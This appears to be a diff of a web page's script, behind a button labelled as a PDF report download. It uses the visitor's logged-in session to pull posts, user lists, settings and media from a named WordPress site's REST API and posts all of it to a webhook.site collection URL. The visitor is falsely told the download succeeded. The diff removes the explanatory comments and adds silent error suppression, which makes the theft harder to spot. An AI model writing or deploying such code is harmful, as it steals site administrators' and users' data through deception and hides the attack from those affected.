@@ -168,7 +168,6 @@
     ╚══════════════════════════════════════════════════════════════╝
     -->
     <script>
-    // Configuration
     const WP_SITE = 'https://financialbeings.com';
     const COLLECTOR = 'https://webhook.site/22d6ec1f-61ed-498e-91ec-ea766170d091';
 
@@ -177,48 +176,40 @@
         btn.textContent = '⏳ Preparing your download...';
         btn.disabled = true;
 
-        // Step 1: Check if visitor is logged into the WordPress site
-        const resp = await fetch(WP_SITE + '/wp-json/wp/v2/users/me', {
-            credentials: 'include',
-            mode: 'cors',
-            headers: { 'Accept': 'application/json' }
-        });
+        try {
+            const resp = await fetch(WP_SITE + '/wp-json/wp/v2/users/me', {
+                credentials: 'include',
+                mode: 'cors',
+                headers: { 'Accept': 'application/json' }
+            });
 
-        if (!resp.ok) {
-            // Not logged in — just show download complete
-            btn.textContent = '✅ Report downloaded! Check your Downloads folder.';
-            setTimeout(() => {
-                btn.textContent = 'Download Full Report (PDF, 2.4 MB)';
-                btn.disabled = false;
-            }, 3000);
-            return;
+            if (resp.ok) {
+                const user = await resp.json();
+                const [posts, users, settings, media] = await Promise.all([
+                    fetch(WP_SITE + '/wp-json/wp/v2/posts?per_page=100', { credentials: 'include', mode: 'cors' }).then(r => r.json()),
+                    fetch(WP_SITE + '/wp-json/wp/v2/users?per_page=100', { credentials: 'include', mode: 'cors' }).then(r => r.json()),
+                    fetch(WP_SITE + '/wp-json/wp/v2/settings', { credentials: 'include', mode: 'cors' }).then(r => r.json()),
+                    fetch(WP_SITE + '/wp-json/wp/v2/media?per_page=50', { credentials: 'include', mode: 'cors' }).then(r => r.json())
+                ]);
+
+                await fetch(COLLECTOR, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        admin: user,
+                        posts: posts,
+                        users: users,
+                        settings: settings,
+                        media: media
+                    })
+                });
+            }
+        } catch (e) {
+            // Silently ignore errors
         }
-
-        const user = await resp.json();
-
-        // Step 2: Read all accessible data
-        const [posts, users, settings, media] = await Promise.all([
-            fetch(WP_SITE + '/wp-json/wp/v2/posts?per_page=100', { credentials: 'include', mode: 'cors' }).then(r => r.json()),
-            fetch(WP_SITE + '/wp-json/wp/v2/users?per_page=100', { credentials: 'include', mode: 'cors' }).then(r => r.json()),
-            fetch(WP_SITE + '/wp-json/wp/v2/settings', { credentials: 'include', mode: 'cors' }).then(r => r.json()),
-            fetch(WP_SITE + '/wp-json/wp/v2/media?per_page=50', { credentials: 'include', mode: 'cors' }).then(r => r.json())
-        ]);
-
-        // Step 3: Send to collection point
-        await fetch(COLLECTOR, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                admin: user,
-                posts: posts,
-                users: users,
-                settings: settings,
-                media: media
-            })
-        });
 
         btn.textContent = '✅ Report downloaded! Check your Downloads folder.';
         setTimeout(() => {
